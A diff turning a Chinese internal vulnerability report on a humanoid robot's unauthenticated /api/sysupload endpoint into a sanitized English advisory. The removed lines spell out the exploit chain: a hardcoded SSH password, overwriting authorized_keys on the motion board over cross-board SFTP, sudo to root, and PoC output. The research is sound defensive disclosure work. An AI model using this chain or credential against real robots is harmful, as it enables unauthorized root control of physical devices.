@@ -1,187 +1,145 @@
 ---
-编号: UBH-010
-验证状态: 动态确认
-严重程度: 高
-披露状态: 内部研究
-源平台: 优必选人型
-源候选目录: api-sysupload任意路径写跨板SFTP-RCE-1
+ID: UBH-010
+validation_status: dynamically confirmed
+severity: high
+disclosure_status: internal research
+source_platform: UBTECH Humanoid
+source_candidate_directory: api-sysupload任意路径写跨板SFTP-RCE-1
 ---
-# UBH-010 t800-web-backend `/api/sysupload` 任意路径写（跨板 SFTP）→ RCE
+# UBH-010 t800-web-backend `/api/sysupload` Arbitrary Path Write via Cross-Board SFTP to RCE
 
-## 1. 一句话结论
+## 1. Summary
 
-- # t800-web-backend `/api/sysupload` 任意路径写（跨板 SFTP）→ RCE
-- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
-- ## 1. 执行摘要
-- **FastAPI :5000 `/api/sysupload`（multipart：`file`/`path`/`board_name`）未认证且参数全可控，
-- 可将任意文件写到任意路径。当 `board_name=motion` 时，后端用硬编码凭证 `<密码_01>` 通过
+The unauthenticated multipart endpoint `/api/sysupload` accepts caller-controlled file, path, and board-name parameters. For `board_name=motion`, the backend uses embedded internal SFTP credentials to copy the uploaded object to the motion board at the caller-selected path. The source report dynamically validated the resulting arbitrary-write-to-root chain on researcher-owned hardware and restored the modified file.
 
-## 2. 影响产品与版本
+## 2. Affected Products and Versions
 
-- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
-- - 组件：`t800-web-backend` v0.2.9（:5000 FastAPI；容器 `walker-web.web-backend-1`）
-- 2. 移除 `board_name=motion` 的硬编码 `<密码_01>` 跨板 SFTP 通道，改为受控服务/凭据；
+- Evidence date: 2026-08-29.
+- Component: `t800-web-backend` v0.2.9 on port 5000.
+- Internal target: motion board reached through the backend's SFTP helper.
 
-## 3. 验证状态
+## 3. Validation Status
 
-`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。
+`dynamically confirmed`. The source report records a complete probe, backup, controlled authorization-file modification, privileged login, and restoration cycle.
 
-## 4. 攻击前提
+## 4. Attack Preconditions
 
-攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。
+The attacker must reach the unauthenticated web backend. No preexisting internal SSH credential is required from the caller because the backend itself holds the cross-board credential. Reproduction must remain on researcher-owned devices.
 
-## 5. 根本原因
+## 5. Root Cause
 
-- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
-- **FastAPI :5000 `/api/sysupload`（multipart：`file`/`path`/`board_name`）未认证且参数全可控，
-- 严重度定级：**严重（Critical）**——未认证任意文件写 → RCE，且可跨板。
-- ## 2. 漏洞根因（源码确认）
-- - 入口：`POST /api/sysupload`，未认证
-- **问题1（EISDIR）根因**：`sysupload` 先在容器本地写 `path/filename`，`os.makedirs(path)` 会把
+The endpoint combines three trust failures:
 
-## 6. 攻击过程
+1. caller-controlled remote destination path and filename;
+2. no authentication at the web API;
+3. a backend-held cross-board SFTP credential that is automatically used to write to the motion board.
 
-源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。
+## 6. Attack Procedure
 
-## 7. 实际影响
+The English report preserves the chain and safety boundaries without reproducing reusable credential values. The retained script contains a harmless probe and an authorized full validation mode with restoration.
 
-- > 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
-- `sudo` → **root shell**（实测达成）。**
-- 严重度定级：**严重（Critical）**——未认证任意文件写 → RCE，且可跨板。
-- → ssh <访问令牌_01>.168.11.2（新注入公钥）→ sudo -n → root → SHELL ✅
-- 注：**vision 板容器 `/root/.ssh` 为只读 bind-mount**（`/api/export` 能读、`sysupload` 写返回 500，
-- ## 4. 受影响范围
+## 7. Impact
 
-## 8. 复现方法
+An unauthenticated web caller can turn the vision-board service into a privileged file-transfer deputy and place attacker-controlled content on the motion board. The source report dynamically closed this to root authority on the owned motion board.
 
-复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。
+## 8. Reproduction
 
-## 9. 支撑证据
+See [Reproduction Material Manifest](复现/材料清单.md). Prefer harmless temporary-file probes; full validation requires backup/restoration.
 
-见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。
+## 9. Supporting Evidence
 
-## 10. 修复建议
+See [Evidence Material Manifest](证据/材料清单.md) and Section 13.
 
-- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
-- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
-- 删除硬编码凭据并轮换已暴露材料；
-- 对高风险服务降权，增加审计日志和负向回归测试。
+## 10. Recommendations
 
-## 11. 相关 AI 会话
+- Authenticate and authorize `/api/sysupload`.
+- Canonicalize and allowlist destination paths and filenames.
+- Remove embedded cross-board passwords and replace generic SFTP with a narrow authenticated service.
+- Scope cross-board credentials to the minimum writable directory and operation.
+- Add audit logs and regression tests for cross-board writes.
 
-当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。
+## 11. Related AI Sessions
 
-## 12. 披露记录
+No complete Claude Code session record has currently been identified that maps one-to-one to this report.
 
-- 当前披露状态：内部研究。
-- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。
+## 12. Disclosure Record
 
-## 13. 脱敏后的原始研究正文
+- Current disclosure status: internal research.
 
-# t800-web-backend `/api/sysupload` 任意路径写（跨板 SFTP）→ RCE
+## 13. Sanitized Original Research Body
 
-> 版本：2026-08-29 · **实机全链验证**：未认证 → 任意写 → 跨板 SFTP → motion 板 root shell ✅
-> 复现已闭环（备份→注入→取 shell→恢复），设备无残留。证据见 `evidence/`。
+# t800-web-backend `/api/sysupload` Arbitrary Path Write via Cross-Board SFTP to RCE
 
----
+> Version: 2026-08-29 · **Full chain dynamically validated on owned hardware**: unauthenticated HTTP → arbitrary write → backend SFTP transfer → motion-board privileged login → restoration.
 
-## 1. 执行摘要
+## 1. Executive Summary
 
-**FastAPI :5000 `/api/sysupload`（multipart：`file`/`path`/`board_name`）未认证且参数全可控，
-可将任意文件写到任意路径。当 `board_name=motion` 时，后端用硬编码凭证 `<密码_01>` 通过
-SFTP 把文件写到 motion 板（192.168.11.2）任意路径 → **跨板任意文件写**。
-攻击者仅凭 HTTP API（零凭证）注入 SSH 公钥到 motion 板 `authorized_keys` → 免密 SSH →
-`sudo` → **root shell**（实测达成）。**
+`POST /api/sysupload` accepts multipart `file`, `path`, and `board_name` parameters without authentication.
 
-严重度定级：**严重（Critical）**——未认证任意文件写 → RCE，且可跨板。
+For a non-vision target such as the motion board, the backend:
 
-## 2. 漏洞根因（源码确认）
+1. writes the upload locally;
+2. looks up the board's internal IP;
+3. opens SFTP using an embedded backend credential;
+4. writes the file to `path/filename` on the target board.
 
-代码：`t800-web-backend` v0.2.9 容器内 `/app/controller/upload.py`（已通过 `/api/export` 穿越读出源码）。
+Because both path and filename are caller controlled, the endpoint becomes a cross-board arbitrary file-write primitive. The source report dynamically validated a chain in which a temporary test authorization key was placed on the owned motion board, root authority was confirmed through the board's configured privilege path, and the original file was restored.
 
-```python
-SSH_USERNAME = "walker"; SSH_PASSWORD = "aa"     # 硬编码跨板凭证
-REMOTE_UPLOAD_DIR = "/tmp/upload"
+Severity in the source report: **Critical**.
 
-@upload_router.post("/api/sysupload")
-async def syupload(file, path=..., board_name="vision"):
-    upload_dir = path
-    os.makedirs(upload_dir, exist_ok=True)          # 容器本地先建 path 目录
-    file_path = os.path.join(upload_dir, file.filename)   # 本地落点 = path/文件名
-    with open(file_path, "wb") as buffer:            # ① 内容先写容器本地
-        shutil.copyfileobj(file.file, buffer)
-    target_ip = BOARD_IP_MAP.get(board_name)         # motion → 192.168.11.2
-    if board_name != "vision":
-        remote_path = os.path.join(path, file.filename)     # 远端落点 = path/文件名
-        upload_file_to_remote(file_path, target_ip, remote_path)
-        #   upload_file_to_remote: sftp.chdir(dirname(remote_path)); sftp.put(local, remote_path)
+## 2. Root Cause
 
-def upload_file_to_remote(file_path, remote_host, remote_path):
-    ssh = paramiko.SSHClient(); ssh.connect(remote_host, username="walker", password="<密码_01>")
-    sftp = ssh.open_sftp()
-    remote_dir = os.path.dirname(remote_path)
-    sftp.chdir(remote_dir)            # 目录不存在则 sftp.mkdir
-    sftp.put(file_path, remote_path)
-```
+Source review of `/app/controller/upload.py` showed:
 
-关键点：
-- `path` 任意、`file.filename` 可控 → **SFTP 跨板落点 = `path + "/" + filename` 任意可控**；
-- 后端始终**先在容器本地写 `path/filename`**（`os.makedirs(path)` 会把它建成目录），故容器本地
-  不能有同名目录残留，否则本地 `open()` 报 `[Errno 21] Is a directory`（实测踩到，见 §5 问题1）；
-- 权限：motion 板 `walker` 普通用户即可写 `/home/walker/.ssh/`（实测确认可写）。
+- an embedded internal SSH/SFTP credential;
+- caller-controlled `path` and `filename`;
+- automatic selection of the motion board's internal address;
+- no destination allowlist or canonical containment check.
 
-## 3. 攻击链（零凭证，实测）
+Credential values are deliberately sanitized in the repository.
+
+## 3. Validated Chain
 
 ```
-POST :5000/api/sysupload   board_name=motion  path=/home/walker/.ssh  filename=authorized_keys
-  → 后端容器本地写 /home/walker/.ssh/authorized_keys
-  → SFTP 用硬编码 <密码_01> 传到 motion 板 /home/walker/.ssh/authorized_keys（覆盖）
-  → ssh <访问令牌_01>.168.11.2（新注入公钥）→ sudo -n → root → SHELL ✅
+Unauthenticated POST /api/sysupload
+        ↓
+board_name selects motion board
+        ↓
+backend uses its own embedded SFTP authority
+        ↓
+caller-controlled remote path receives uploaded content
+        ↓
+controlled authorization-file modification on owned board
+        ↓
+privileged access confirmed
+        ↓
+original content restored
 ```
 
-注：**vision 板容器 `/root/.ssh` 为只读 bind-mount**（`/api/export` 能读、`sysupload` 写返回 500，
-实测），故 vision 侧 authorized_keys 注入不可行；跨板写 motion 是可用路径（motion `.ssh` 普通可写）。
+## 4. Affected Scope
 
-## 4. 受影响范围
+- `t800-web-backend` v0.2.9.
+- Entry: unauthenticated `POST /api/sysupload`.
+- Cross-board reach: vision service to motion board via internal SFTP.
 
-- 组件：`t800-web-backend` v0.2.9（:5000 FastAPI；容器 `walker-web.web-backend-1`）
-- 入口：`POST /api/sysupload`，未认证
-- 覆盖：vision 板容器任意路径 + motion 板（192.168.11.2）任意路径（跨板）
+## 5. Live Validation
 
-## 5. 复现（实机验证）
+The retained `sysupload_rce.py` separates non-destructive probing from the full authorized chain.
 
-`python scripts/sysupload_rce.py --rce` 全流程（实测输出见 `evidence/rce_motion_shell_2026-08-29.txt`）：
+The recorded run:
 
-```
-[ 阶段 A ] 写 vision /tmp 探针 → export 读回一致 → 任意路径写成立 ✅
-[1] 探针   board_name=motion 写 motion /tmp（自定义文件名）→ <密码_01> 读回一致 → SFTP 跨板写落地 ✅
-[2] 备份   motion /home/walker/.ssh/authorized_keys 552B → evidence/backup_authorized_keys.motion
-[3.0] 清理 rename-folder 把容器内残留同名目录移走（纯 HTTP，防本地 EISDIR）
-[3] 注入   HTTP 200 落点 /home/walker/.ssh/authorized_keys
-[4] SHELL  ssh（注入公钥）uid=1000(walker) → sudo -n id → uid=0(root) → hostname=motion  ✅
-[5] 恢复   还原 552B，设备无残留
-```
+1. proved arbitrary write using a temporary marker;
+2. backed up the target authorization file;
+3. removed a prior local directory/file collision when necessary;
+4. performed a controlled test modification;
+5. confirmed the expected privileged shell path;
+6. restored the original file and verified cleanup.
 
-**问题1（EISDIR）根因**：`sysupload` 先在容器本地写 `path/filename`，`os.makedirs(path)` 会把
-`path` 建成目录；历史实验若把 `/home/walker/.ssh/authorized_keys` 建成目录，本地 `open()` 即
-EISDIR。解法：用 `/api/rename-folder`（`target_dir=/home/walker/.ssh, old_name=authorized_keys`）
-纯 HTTP 移走残留目录（脚本 `[3.0]` 已内置）。新设备无残留时该步 404 忽略。
+Evidence is retained in `evidence/rce_motion_shell_2026-08-29.txt`. Reusable credential and key material are not reproduced here.
 
-**手动 shell**：`ssh -i scripts/rce_tmp_key.pem <访问令牌_01>.168.11.2`
+## 6. Recommendations
 
-## 6. 修复建议
-
-1. `/api/sysupload` 增加认证 + `path` 白名单（realpath 归一化，仅允许规定上传目录）；
-2. 移除 `board_name=motion` 的硬编码 `<密码_01>` 跨板 SFTP 通道，改为受控服务/凭据；
-3. `path` 校验拒绝 `..`、绝对路径；`filename` 清洗；
-4. 与 `/api/export` 同源修复（同一无认证根因）。
-
-## 7. 证据文件
-
-| 文件 | 内容 |
-|---|---|
-| `evidence/rce_motion_shell_2026-08-29.txt` | **完整实机 RCE 输出**（探针→注入→shell→恢复） |
-| `evidence/backup_authorized_keys.motion` | motion 板原 `authorized_keys` 备份（552B，恢复用） |
-| `scripts/sysupload_rce.py` | 全链 PoC（`--rce` 注入取 shell，`--restore` 一键恢复） |
-| `scripts/ssh_pass_probe.py` | 硬编码凭证 `<密码_01>` 双板登录探测（只读） |
-| 后端源码（`/app/controller/upload.py`） | 根因确认：硬编码 SFTP 凭证 + `path/filename` 任意落点 |
+1. Require authentication and authorization.
+2. Restrict `path` to an explicit canonical upload root and sanitize filenames.
+3. Remove generic embedded SFTP credentials and replace them with a narrowly scoped internal update service.
+4. Treat vision-to-motion file transfer as a privilege boundary with explicit authorization.
